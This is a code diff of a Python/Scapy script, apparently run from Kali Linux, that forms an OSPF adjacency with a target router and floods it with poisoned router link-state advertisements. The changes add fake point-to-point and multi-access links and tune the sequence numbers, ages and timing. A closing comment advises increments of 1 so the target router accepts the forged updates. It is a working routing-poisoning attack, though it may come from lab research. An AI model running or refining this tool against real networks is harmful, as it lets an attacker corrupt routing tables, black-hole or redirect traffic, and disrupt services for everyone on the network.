@@ -11,7 +11,7 @@ last_lsupd_time = 0
 lsa_seq_r = 0x80000001
 router_info_logged = False
 
-log_file_path = os.path.expanduser("~/Desktop/ospf_log.txt")
+log_file_path = "/home/kali/Desktop/ospf_log.txt"
 
 def log_to_file(data):
     with open(log_file_path, "a") as log_file:
@@ -33,8 +33,8 @@ def log_dbd_flags(packet):
         dbd_layer = packet[OSPF_DBDesc]
         dbd_flags_info = (
             f"DBD Packet from Router {packet[IP].src}:\n"
-            f"  Flags: {hex(dbd_layer.dbdescr)}\n"
-            f"  Options: {hex(dbd_layer.options)}\n"
+            f"  Flags: {str(dbd_layer.dbdescr)}\n"
+            f"  Options: {str(dbd_layer.options)}\n"
             f"  DD Sequence: {dbd_layer.ddseq}\n"
         )
         log_to_file(dbd_flags_info)
@@ -45,9 +45,9 @@ def log_lsa_details(packet):
             if isinstance(lsa, OSPF_Router_LSA):
                 lsa_info = (
                     f"Router LSA from {lsa.adrouter}:\n"
-                    f"  Sequence Number: {hex(lsa.seq)}\n"
+                    f"  Sequence Number: {str(lsa.seq)}\n"
                     f"  Age: {lsa.age}\n"
-                    f"  Options: {hex(lsa.options)}\n"
+                    f"  Options: {str(lsa.options)}\n"
                     f"  Links:\n"
                 )
                 for link in lsa.linklist:
@@ -130,6 +130,7 @@ def handle_packet(packet):
             print("ACK_SENT")
             
         elif state == "FULL" and ospf_layer.type == 1 and poison_time == 1:
+            send_ls_ack_target()
             send_poison_packet(packet)
             state = "POISON_SENT"
             print("POISON_SENT")
@@ -387,7 +388,7 @@ def send_ls_r_upd_update(received_packet):
     ospf_update = OSPF_LSUpd(
         lsacount=1, # Number of LSAs in this update
         lsalist=[OSPF_Router_LSA(
-        age = 1,
+        age = lsa_age,
         id="3.3.3.3", 
         adrouter="3.3.3.3", 
         seq=lsa_seq, 
@@ -429,7 +430,7 @@ def send_ls_r_upd_upd_update(received_packet):
     ospf_update = OSPF_LSUpd(
         lsacount=1, # Number of LSAs in this update
         lsalist=[OSPF_Router_LSA(
-        age = 1,
+        age = lsa_age,
         id="3.3.3.3", 
         adrouter="3.3.3.3", 
         seq=lsa_seq, 
@@ -581,12 +582,16 @@ def send_poison_packet(received_packet):
         age=1,
         id="3.3.3.3", 
         adrouter="3.3.3.3", 
-        seq=lsa_seq + 99,
+        seq=lsa_seq + 1,
         options=0x22, # 0x22 is Demand Circuits, External Routing
         linklist=[
+        OSPF_Link(type=1, id="192.168.99.99", data="255.255.255.255", metric=1),  #  point-to-point links to another router
+        OSPF_Link(type=1, id="4.4.4.4", data="255.255.255.255", metric=1),
+        OSPF_Link(type=2, id="10.1.1.0", data="255.255.255.0", metric=1),  # Fake Links to multi-access networks
+        OSPF_Link(type=2, id="10.2.2.0", data="255.255.255.0", metric=1),
         OSPF_Link(type=2, id="10.0.0.0", data="255.255.255.0", metric=1),
         OSPF_Link(type=2, id="192.168.20.0", data="255.255.255.0", metric=1),
-        OSPF_Link(type=3, id="3.3.3.3", data="255.255.255.255", metric=1)
+        OSPF_Link(type=3, id="192.168.30.0", data="255.255.255.0", metric=1) # Network with no OSPF routers
         ])]
     )
     
@@ -603,11 +608,11 @@ def send_poison_packet(received_packet):
     ) / ospf_header_update / ospf_update
     
     send(ospf_packet_update, iface="eth0", verbose=1)
-    time.sleep(2)
+    time.sleep(1)
     send(ospf_packet_update, iface="eth0", verbose=1)
-    time.sleep(2)
+    time.sleep(1)
     send(ospf_packet_update, iface="eth0", verbose=1)
-    time.sleep(2)
+    time.sleep(1)
         
 
 def send_periodic_hellos():
@@ -643,4 +648,5 @@ while True:
 # all variable names must be correct (lsa_header, linklist, adrouter)
 # ospf LLS TLV defined by OSPF_LLS_Hdr
 # seq must not be incremented in LSUpd unless there is a change in link-states
+# if there is a change in link-states, increment by 1, not by 100 or 1000 as recommended by research websites, R1 will not take them seriously
 # age must not be greater than 1 or else our Upd will be superseded by an LSUpd from target
